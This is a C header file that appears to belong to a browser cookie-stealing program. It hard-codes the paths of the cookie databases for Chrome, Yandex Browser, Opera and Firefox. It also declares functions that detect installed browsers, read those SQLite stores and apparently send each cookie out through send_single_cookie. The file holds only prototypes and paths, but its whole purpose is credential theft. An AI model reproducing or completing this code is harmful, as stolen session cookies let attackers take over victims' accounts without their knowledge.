#include "type.h"

#ifndef CH_PATH
 #define CH_PATH "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
#endif

#ifndef YA_PATH
 #define YA_PATH "AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
#endif

#ifndef OP_PATH
 #define OP_PATH "AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
#endif

#ifndef FF_PATH
 #define FF_PATH "AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
#endif


#ifndef browser_prediction

typedef struct {
        char*   user_path;
        uint8_t FF;
        uint8_t CH;
        uint8_t OP;
        uint8_t YA;
    } 
browser_prediction;

#endif


/* Main function prototypes.
*/
void dir_reader(const char* directory, char** files);

uint8_t check_file_in_dir(char* filename, const char* dir);

char* get_ff_cookies_path(char* curr_path);

browser_prediction check_browsers(char* local, char* roaming);

void collect_data(browser_prediction status);

void get_sql(const char* sql_path, uint8_t bt);

uint8_t send_single_cookie(cookies_datatype* c_value);
